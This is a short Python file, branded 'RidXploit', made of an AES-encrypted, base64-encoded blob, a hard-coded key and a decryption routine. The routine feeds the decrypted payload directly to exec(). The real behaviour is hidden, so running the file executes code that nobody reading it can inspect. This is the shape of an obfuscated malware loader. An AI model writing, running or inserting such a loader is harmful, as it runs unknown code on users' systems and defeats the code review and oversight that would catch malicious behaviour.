# This file has been encrypted using AES and base64 by RidXploit

encrypted_code = "RidXploit_9Ljg7u5mNfApUGpA41Q+ofphNNZrOqfEmBZqQ359e0Cgu8NIzgm5wj71DKAaqf75ax/EVW4amMbibLZhK0SsGHaGd1BR2KchgcJgW2Xi5zLdpCncYAmhlt6WsSqveWlb+TN706zjvLoyxBSXv4XBxQzCPYnOP3r3fuch+aHKuYF9ObJXtGEJjBvURq3PWZJ6wgnLcuiPycpqaLUa1jjQOyNXviuG4cdfKUTYbTtFQe1IG1nPv5WCDqzheYbPrMAA/BoipoGPlZAO5YMGYFfMJPNjzacnmmtBz1Enwf2Gr2smOTC9szUFZwXU7MNNHJQm7di/iD0RWee1WGNp3Sujqo+wHeNGz0GdSCp5VkRo2d/QVXwVXe5g1v2R/njKAvxTjSXhK+lsUF7j1ETrDFCSLKG3T7gtzRqhMK1Hh2+jHV1dIq547KaKyLldKVZEqc/X5snIKV6GrlKxAoCs8ge3F0qOqS4DPKAzlKEW9//wk8uiHZQwGgDkJk4CBwPLeX6BSKSVbXT/nKzRFQdLpA2Un1V//0NsbQugFfURduHCdJCEe1B56UEZPRXCHB/QaDrQL+Dmq2eKgpEHrVuO+/uEcEbK3Fx3UypKg2QTZciCZ3K86VITJ9sSpKQJKuNlqfFl+SMe6gE1XhJcwB9/psD+9HilLrJmO7y0FM0vwEUezoYiqGxKl4BKP/tWIqGF9alFBvgat9jFaS2mhj0qF7WaJAHPRzyjF7njSn/dhxmwjJ+xdCGzbuqsbgQkPv+FvPn+0be7R8SvYkWZTuKnOE8xtMfVp4KfSCNRaP4mu04ru18l23YwvTQUJIL7f4foWcM3N8NdDFRizN2A54/NGWmn8979uTX7IiZoXw5meUhUv1i2Zi5Cq7pxs4Mmo4DgU+yWTC63I6wssTljNnE672/EBw16ysg44+f32Jw4Gy5674JhQL9g8WCXelIfnPuYHqngK6hxIUbIn/39vN+5lsiGuNlS3mB6NBNfNhbvtZx2vz3Zuwat2q4Gu7Z4DP5zfpCS+CpKzzISFZkg/pXI3oXxojCcQP/Nqx3wIeZRQYX1t2GZuYyLXyVCaTVrhdUzNkc2RPnnWBgElC2tL8+zc7PelwQ10gQY/VqRkw758iLNlmFgCsjEGpl42H6+WppYcTbT+MEruiy8IKVSpzBmkOpJFOe9JViB+qzQeM+wLCVMbb62yXrVas2zljVw8EtbYDwuw8FoJlM1tmG4nv4LtlHPZjf1HeJiusjnbd94YFO12stxD2zP1bFWmh3RKTT6x0cnYsQ1iQMPkgiQxQJBMPkj0PoCbQVChMfbPNSR4YOR/LLocZP36qu+unOUR64cU7xOcW2FPkEI0bHgziu29E4K6amHZQP1IMmuTcXpLT7ohBxNT9uQyQB0LlkZ1pFH6tw11b0fC/MD/ev+R/Na/mfNcp+j9Xzp+zYD9VyBobMNhuGxgvHXJlsuxf7v3lWFkuvdDhNsseZbiMlhWlFe/h6YW6wpQ8WDfPzW/nt0Kr8dhBVkqIEFuxczwBvQnoyeLlK3AMavxJ0Uj8ytS/wO1YXJn6PBWDJ7Ym1XC3AHa55Cz2oOYbgaWtQ9OmzDfB61Bqi9FjKykPdfiPRdB57T09WsQ85QD5vCowXskEOvwg0JMk7bWjTVS2Mq7e19h2ujSoEDQzC86sUZBrLz73UL5I04qPbIrPFaUR7xbI1pKNd1Ea9SqDnI9azk8Bk8rfRlNXN8+U3+39pcQ05wPQBS1LbCLk+f5B9g+siINyPmkZV7Fvb3TQbYEdBpvysIyXmj1dghCziYe/5g2dvw1cqYp1YVQihf+uh0ATaVilfp3S48mYMt3yu+YEuNsgXuFp+NqOIX1tKJaxImdv8mfziBLpoeSb7ayz9YcZ8GcE8EzRv16KOkUeA4Oh6i0ih7hLh7BkI/QjfmOv8lXOvlZSD1hrcXpAts81Va9JFLGQQU4rfCSKbGNwNxureQjYuYU3XJr7Ezb00nShY5tqo3eDztDa/5A1sJD4ZpfqW3CR5Y0mpckUYJZbGdbHMrZ2h+C6tAVMOapJhZm5TxVEqWBJEn10I8n2D0kPLfPuf4wEU4qljtx1dktOozKAvFF6GSHWpiDrUm3wKSDtywuNg2TMlDkKCOjmQIXdmScAeRc4ohJw+3ue7qulKjGDAYQ1hi1AaAQ/aQUTbgHwGvqyEG/spbP0yv1OwZ/vPFgGxdDCJkSW8pRGq8dvH9brY5Vlv3r9GnJ4tg/YLTZhtZA33N3Os/pMuw6Jd90aR9fO9V96nAXpXdm7FMBWiTzuHaNtVgBPGuivZqAYk35xb8FsTeqrU9j4k2Wr8wozAn+dxpa5kZgTSurs81y3VyhXzSRa4rlJ0JWnQhykpPvUgT254grwcoWKRYD3zh4oyVYsXCMm2mDd+fNKHecNhVZh5t3M4ZbwM5/7nJv6CrcckdI3NSnZTVGhILoQmQrytRBq0rqwFhAOsBUrgRaJti2z8CmUsOPi4KBaf246r85PrMGEhp1HQ8pFzlIjt8V97kaPAB2Z92hg7mwKg/CghVovfPhWR0bd/gz6QOqYh0sJsGhbtL3aK/SBuiVvEPa9eZZla6rdFJzJTF0WSn8bQqmtAUWZyvdYBrqv2jrLH4MWK8Hn4Mo60f/oNithMTHu7wJfNcU8p4SfnK/86M/cUaq1X8MXlrtcP+Iu883QU+fPj58oyQJLBVL4qn5bBPvXuRPKMsANE+UFVUykg/+KHyeJpPD9yw0ZaAf0xGVCdiBXdoMNYfC9toTQp+9Sw7Aod5BGj95zurk0w/5xrslR8BxeFsok8VZYzoN8FjCcLPOYAvd1tO0LKVBp7ACwpIuAAQ6KmyCzRZA1oc++ADyqRzKC74UyvV7QqOOHa2mdKf7wZeu2E02BZ+2XgntdFI1gRU/hUluwvMjSAX+AT2SJgChPqKT8QwWX2/4Em8C7EvYcZBsOYPNHAjFnsTmwqKwzGgp1Y3Gh5+/RrN36kwOYHxuE4A+CbVBPIk/O97MD79jR14k29T0+s6PBGQQ2d+BxvJIH4eqrhPsNYTfbpP+DAPmrnnlfk03rKtvcOg9r//YRreCvS5XCzPEvqqMRdHayeTOiKMWAQezc39Bz8YRC7qaXnswixjE7nMaU3yV0KeYITVs59RdvPOgVZbQZuNTCblF3u1lMPScS4EwPYNa9M+ke62KZopZngPoodCqANHnhiYMl/5ThtI4FN4GdrVDGv0Vxc7zlBJ0GD5GYr7cjYusNFoxqHKtgsMHsk3TK/EJcxMAAEDRJVhJf57WLKRd8L0i+TJnCHcYkjzcymYUtlncM5ZvmdRVMI05+rOiXnvWIeQhhoRQ9vsrrnxGy3cKZ24EbyOKsvKiT7ccvi+rFmcxjDGeIt6XYNicYbyPaWdc0UIjUa7pansufgnGGq+cRUwpJK2oN8psW7PuRUFi1QN5NFSFMur4OfXkozECdKlWp2Uz0dSKql2HJY0i8Z+bUKrpnLvFYdkvWStDJsVi3HNDrS7NXpm812M1IHJC5V8m5xZTAXdvFYdp29TdyO2y3qyW5LDWmy4m/+PhlMAFP2JLZyZuQ7q+w5imGvKMfY3ZJaFL4UuuON2mOTL/VkTwmUaFR/8yRYc9skz7H9LtSAQEAaheukyV8+ZsNXvrCK/1uitks2EniDnaJWjHGDdENDb95+RGycbJg8kHfSm6/MaTvnLE4to6c6WqVcSGP9vClml4lY4DACXRekwhn7hT67CWs+k3rFYwrv+pj+inGPoktEcvHDyQRw1v/PSOTzrlj+90hoYPDMgURyIycsRPVVoNjxZ+Y4IR81jRi68kZxUhOD/m1vw25WuTCQSF7Qm67bbNyDnNFbTsjP9U8faVOj5xV6HSbNu9yGBME1sVCFhSMSwwBc5xkxeCyi4OOXvb1EgLGDwi/9dQCmy/3ub46da7wVZxk6/MZb/3IRr0j5YYJnXVEKoNYLlWAWrw8xMzez0esVj9RxCVawy0kD+1UK00p9o9s9REHM6hN/VX6VCTc1mDRVw0S0RvmDaWlnv3njC7E4hHpZFjvqa7cYDO4W4p+5hqb0P/+RUW34qSNtk3dLH/ZdiSwCEAO8x4KnASnCdxSXo/bxLDLz+Vf8uD9MowNVA+vluztneaFktxe5zHiXT1xow+62kQDQ5ioIW4tku6yc5XGJwcTueoevOxsxcljFSGTVQiEsVk9Gc1ot0qXgY067IrbJOzidDM3ZNK/azH747Ppo89zLZgkVdBb6AGxteMESpECCbCmPzEgwMf+rktEhj4gf6TjN9dXtS/jWkUITbCG2A4v5UmbUVC1hAORPU8gzY9n1EFDEWqbNFZcsUqHoY6lKLunhxyKRxINJ8HsGtZ/2zrJbNhPZPBm78kqcSFNdBleOGdEhyxhhjyF7gVth5HaocWNxMRgcdvj0qri2FewKKhmIz5jukk9p/zHlBoQDIFryQxxljaeDOeEeU7zhE+2iz2m+OiT0T83RlHxVRMdDLbXNMzuHJA0XvMmQ3lMouGFOprRq7RY9Tf5IzTPskD/F2XjkxNA5/L8Mq8DurUraXBP/C7jVfrzMBDUES1qrRE9HOy4fLzUeZxq8hUnufUFIbff2o+3U/8jP+fL6n3jvdBLZkXzzpO7etGeE2wOPNGlajP3mGtpkYrCr+MwYPORMnESRtBpmpViO2UcADdP0q7XEbnDO5Wzzxx7EbagP/QB6d7+tItGxMsEQuJwSIVHh0+FNNoNeiuv2lYU2iTd6nySN7QBh4BOhO0mNJBXwx2w99MJNNc0TMdM6JlKiwT1WlZW1ia0KpE8o5uJylKLl4lxM1BLnxccyoMVVWfWKUeV7Hri8hKZdJ0HNuiBAfqvxkdPpJO7uhv/Jd1knD51za5zuQXhDhtu9CeyCLDDwN5U8bEV78jFynwSVODWvmjgQP804274gEnmbwz082vnd/bBGXNCySM8MS69sVEQLQJtWvpAcKId3k6Br00H0wICoDUPcFnnZk13o625+gN+iYK0UnklyYVH/JMT6JXhHUmEqQspUFMtmiM4cPbpTLFC1FzAqZU46kzPdT1Hjgz6k15V8YU0uYW/RrbQNU3//siBjFevTaCdqxVcNzEEhi2LaN48nwn4tValF/8R/riBmY659Blz1uyT8HduRkszTl45DYM3aS6xSDy7CgUC/A8IiVm6jEeh/kSX4rFED9ihiLl+XN3il7HHS/36UniszMASy6xF3i4zUTRC5QbZ7Jeb6igC0tNVvxVBQ1zkHVWK73QKutDdjZdUkk/UguFweTg2wMdrq9utzXeKPaKFvYrTOfOGwK84i/XOfUxry+KVIPv8VPPYp9QeQWB36F2li9iCWgxyN1UG+rl5pkGEflNiolOv4eNjVEsvS3LJsygCSPra5FKwhn7PMYbPeKS8V1mq4K+gq+SDBMNUCNOu2AAGmoULkJUsFBGQZUjaghtTYEOCGw7qTr1p6I1vLCSOYxEwl6qDOKcERPFdFU3eGufGqOX1mjkb4AXEhSg+5Ti76EZZ74xSEey0Q0bUd5zAc6TkLSDo52bG/82NZ5KlEh6WVsO8hDQqHwmienTWNw99/U+2Iv79fWw8J4czaA1KJdhBqp7OFSsj9jJLilPm2HlhfLMz4fd2Q1UlNkLKNHmtj12aMfqZCB5GqbAtlFWJGx3RmNKYRkKexKKSWNX111zeN4YvxB3PzMelNwFR2Os6YOtDOLXsNGIYXj6aUkMfywSlSfR1azOIBginWT97ivO/x9TxjCHGrCgYkO1Ryl6fldQDDxNTD8oP3toH5Z+C32tJJKKlC8g87mGA5GW3/7LkTyNmnHtGzDa0Xxnr1w6ZpQizTMGbLizwRCTmb5a86rv/tFAf4e2ZmRy4UcnQ2W4ahw4tjN3aBa64lpDpRaAMs8VNdbh7GUpJMONd16GLdu1AqGiG0CN5BdI1VeXrfc1ZAzF3XEBTs/87hH2uy9H9DroIGTezSzsGKmPjD5bNi9qqMWi1vRIGAGIm8KO4zOVDRYx9zbFJv6LAz2v8sw3TKBYK0rcIL9V5JiEt534iug6NRo3MUAXalaT6Qwna3gBv+durSxSOJtSUVi1/Ymr7emXgDBUEFqc/zltxw/iZ5C3REiB4TLMP9lnPIHfStgy5pfrZz5xB1w8WWk5gBG4fn2anD3GC/+N4QFBs3p6Sgnyd+DG16be6jAEh+TuHbvmUkFWvppao9WjPs1w2fXXJltABPgdzCzqdkm5imN+qqdhYZNS6jUzr31v1DCx1oG1l/agAT4wpQw2hcdi9dvDzYo7bpch6aT1e1FczGnZTdKts+N6g2CHBu8PnHrkZtMvhypXk6yQv5hOZZ3n/AqQTU8sgvcf+R7g/ZBBFBKP2Nu5xGrwvWwAGSByaOMb14B+xrvK1K/lE7v5Kta1kkwm9bl2erH6jZIHIEwda89X11eP8tnlcyM6UZvcrkeJiTPFQATUOApMmrIVHEYXUJqF3dXJH634EYhQMamKnHrOk4uArhBJjHUDAudSqEVxtqHgn+yx3/4/EMM2xxehWrEv6WL4a7xkBAtQoISRWs0bQeY37QQrBv8/uNtPLqxGIa1cUp5ffBoJzN1Gi044uGRELAM5iPfkKHfMhl4JV/6SujzVsMPAtxicVB4oAep0ZwwgXGks19FMfx4FV+eJhj9BUSXYt+3CjhH0cImu158MRzWgv8Wl8MWfLycNnmWdng4aLcjSVMmsaRdcNMOyFrdnqpHjBK2obV6nbgPp14Tft1Qnzy1AkQ2kQy7zK7Wy8pu/eyeBeMmAof2URrCJPtFfyPBW/S/Yv8vOCweWscddlLZdYtmXW0NNUbpJVUmM92WXMRx417u6/ChCCfaEFV12WlVTqoqwRpSlg6SWbjP8CItBWjYF3+VQpgiv0l2pzBEoJK5oMOCTXqGsM11xuvc8Vy4GLtPs10WB2AuQWeCHJFeboN8wBdivmrBLkv2j2gQH5VhWlCeHgolH7p4uQ9BbmVgFwWCnquv2q+tbgQ7fHbRFBke1504AiEpZ5mD9aJwM1J+ERHoLzsksimbkj9WUtQ/TLcizPE5ipROoFdjaTz1Wwz9Fl+cPXanlNU6Z5gy7Y41cVBjOfuyAVGM8AyDnE9wyZ9eRfCCuDdvlv7ea8/9o2WH0hQ+9kzmlZ6HKTgucL7fzYoku5b8wwRYLZp4eKqtCB5W36ImV0y7FnkykVKBpWVIRVOgg/+6ZGBOASV+rNo/rz1StG8DlRJT4MLaFzvSsDPp/6nvC4yHsbLnwBJokMCY/6iFLddItq3RH38ZjMhr3fbdeZJkMgJe556HH0V9vUJYGp6UEDfTAS8g2o4sl9KZJ5T1rVsY0/nrHPOiM2qPSW6o/+rWRH0WZSNn7e4UjaN715Njo/2QpNoI97TuHq5IXY0LklWjuyk9kELaLqPDKaucgu3wbL8oX3UmhLmHyLMPOrVQNezr6/kkHX7lDHyvxCuH4iTNiSKeJI4dFkrZKv862T1S0Odu/N9Wmfak2tZ74CtihIexJ6NRpRr2g63u12mrx8Gdda5CIjuBCr4/WhVtFx2O0ZQ59QWSbSABLirFTljn/xKXTduOiaHqMSNaCvc7WzHZMQpyJ+u9qnwocjdwFtNZxQ/Q9ZNhqVxgWA8aR/N6NqQb0HL5hfrIulXtzCyKbeKmCmVVedbS2/bU1dHQ4kURs3C84sNo5Oc6FyCr3qa90vFiApUaYhURVe1ZPoUc1xVlRCHd3+FVCtIb2Wh7QwUXwTeqAokWRewDIYWZ5xCCF6FbFi9tEfF79IRZJHcOCMI6sQJVWCzWiwke+U11Xd/jvTMS1O7B7oWuHKQmEpN/kCv4kFbU42oOCkpNlXxxWuuEpdQ/MyC/NvTodK/zb3A/rTjtkXyOEcAbBQYXOwegnwzB0/FRfhMXCp35KpboVUtfp1jibG9NzxXuWTHNPC97tPnHsJA49zPNT37UgpC9R35jX7GoFNMtqHDzixVz2t7zCY76m8d5LRiBHMiOszAjsr8tP4WiEsfF4yWv091oVcH68d7sSZn5DbY7FGCQey5EFRQHbxauXSccakTz0NFIA5x9h5uOQdWGoFQAOeTbknoHQi+vXp+FEHOY1kekcTrUH48Iot8fxYI2b/cZ7hEIjnkU1yBUhjrxtLo6jIax3YXzC8K3uEWtEWpno5cVnErcX9oGKumSA302PxdMh6VXrzWjAc9MopQTCM3OnQiM9ir/Zxh74efB3BxqnXwHNtF8uFo3Ww+Gab02YcSJwssFSj/OXz9pw6n179NnAMU8IPz7djDDcVKURzA5JIslTBahKPzpjf+WerrZWjvt6oOqdCBLl8yqSyF9yvefE2ld5ty1N/AH++3fF0cHU3cTpQDEkdfjXB6rkRvjoRZnwE5AcnmI84Nb9Uu1hiPPrNpIDD2HgaZvP4ZvyHk74obHczaJq1mlwEoJa6+MHjVMzEPB0J0D90yO1DUgtRcscbCaG1JKi/YAXsgfiVb+mzSMiVpTS/5a1GHvsSuehOs843RLEHgiSGoqLS9EDVT9LVgdw7pHaaV80T6uYPSUMfeTABArkSF8r2uaLSnQvhlo+Z/LJL/48+wVcZVGEstu7wWEKzh2rZA84yGbr+ZjorR0QqhsII+mPhkIkoneOLoAvWOSxjNGfERlahCWrCWKFYADhNTHlGttsl03rHJ/Nhd54iXCG6ydEArvDC2//wNsDFs4Go+lIvWGTIr6qj5W4Rt/ytHwtyd9f9g7AJRO98WsvQedIxhcZz2HekOWWY+ngtNrIELRhhx1sd1hQFnpB1i3TSkvlLlBEZBog2hBN7IErX1E6yxuOYoPrWUL/zw5Y4JbfE4ZUnyWhLTy2xiyWFTPuny4Hsp6PA4KYU0h4G9Z3ycAchJko/ZRYWtrPy0zM9vmyy2rlKPJZ16vpdCvOA9CdWDMvlzWs7HAQ7o8dVMux6jX54nvna85fF5QGTUiYNgfzq+3M9CqND8F386DTl+Tu5ifzdMIO1DTEac6w45Qx80gVyOckkM4LeLLq9twgI+fOpS9MRjbB+soTZKQQOE1wX2UsVkFrnjKPbaFLLu9aMjhGT3Gcduv/kuu2ubGmbSXCVBVutmwtEqdhjBrkI5ZrcLf4rJEKmiB+PtuEyEoHnntflSOXOQXqyV8nrlsG6wE63yipOtLyjNUt2Aeg7ryKRZChEFvU+s6CgnsUvylpLLjIDG704RRp39GRRlOeoPvtFXHBduXDwwz5X48A70TRfQt4EDfiYNq0vDI18QFYPE90fUXuSAWK08PMtrz7rZTOaJk5NjrIwDnpCQBse3ED0XrYa8Kgq7RaXzkMotq48+2rlRWzb027EJ4kKpsJYXkCSeeWodlvZfdt8ezcSiAxe/tHXrKs9A3bGp6oYFsH4vXaynPzJLvXXrxc0O1r8lEDm+P8v2d/hje994gx+pr34c+BIaUZCdwYnt9tR98arh55Php7fcltiEvOAF71IivL8kPiP33bnnDiYktK/1FPiaa6nptCEm4Jz0Zdd76IBQu+w9EdbjotixUE4DxPCbu1ywKwjCI58srtz8VbCBH4Z0OckrzdYeW299ru66bOx6C8zQI+KcnkU4xZrVoB14uo61OquPF4yT2leNRkTA+FZ++w8itdwjDnijUgw+oBYU3A9/OkReiyceb/7EX+/nhsvXZOGd2k4b/uOL9By0GETvgAQlPvT2+DKD94daZaRVRAjXDcvQsUqKKCjddL1XD45V1drkyWM9xjAjnX70WQskGirkytzyBwSAv05W3/s6eoMS6NDteLifktoM9v4dxFzBfhAMpZQnjevq49QBc3ygszk2HnCyltHyqTHZ8fg5iTjgL7IfCJyQSPYv1zVg0kAHj3gLfWD2RJiiqs0GHPz0rxahuLflFa31qDqDqXBON9xpKsc5tmBr/6bFIUn1R2UfVzFvcBHNHONChxGAn4ITeEki0r0UFAoleQf1J4cPxdt3T/6uzH8VdxC2BJpOnAp3uuGblPx3CqW1aN5si8g1RBXiBX2xMph2z24YuvhNP4SKAz04Zkc2B5C0QPVcwDZCM0tLb1IeFL1vkjgsQaidoWQrOVWPPV6Fb1lSIXTsu+5TNH4rTKwdfiBw90mhX9A0IGA+mr0Lt3m9ApHhJUYgkCx+BSdQKrcjCUiMQ7d2kzn/MLak9Mzs776sF9B/A9do6VOrL1qRo7TNu2m+MX729I1pskstI9xO82nVcDR9bHuOizO7qZZLFHZXIr0mZ25dfI+sZNNwFK6Rse4SxA//dC6r2strNNxczTBWRF+WFr4KiXSpyKtNEWjaaJJJmt4ZoCulrJom9CK5spkQkRkEersEAOI8Xtn4Hk/Kq2r0ehVRe9GkGBwmj4likS9Qc9tQlghLlyKLXvbusln9Zj38FjMonSu2ezvmSZdpPpeuxOpYENwd31BWTtDp1mPk/J8XtpMVjIocc7fsuAyTV+f7755ZFG5tRTIZ0jGg0h21t/MkgDehTTE8xNZHm5vSnkPnOot7dWylAzLUWwOvuSMEE3NBGcqLPXphOzQSSZftL+3RUtbLpa5j0fvp3xSnhS8CC+XeVhgEd6Jlg4+W5F6l/bWyqcqrXRmlWSUC9GEV49SWuFpiO+B5m6AmKcZwuUyLhatPxkGlOdXHWhEAumQAIBaOjAuxfp1i96w8OYyGhnwA4aDOAvg0o9IGz3NQe4/iacZCoSIIfiJz30g==_RidXploit"
key = bytes.fromhex("01dd0c114355e0bfc7a5d9f7cd8216fe16ca7297121cebc8bd30485c282a9719")


import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

def aes_decrypt(data, key):
    data = base64.b64decode(data.replace("RidXploit_", "").replace("_RidXploit", ""))
    iv = data[:16]
    ciphertext = data[16:]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted = unpad(cipher.decrypt(ciphertext), AES.block_size)
    return decrypted

# Decrypt and execute the Python code
decrypted_code = aes_decrypt(encrypted_code, key)
exec(decrypted_code.decode('utf-8'))
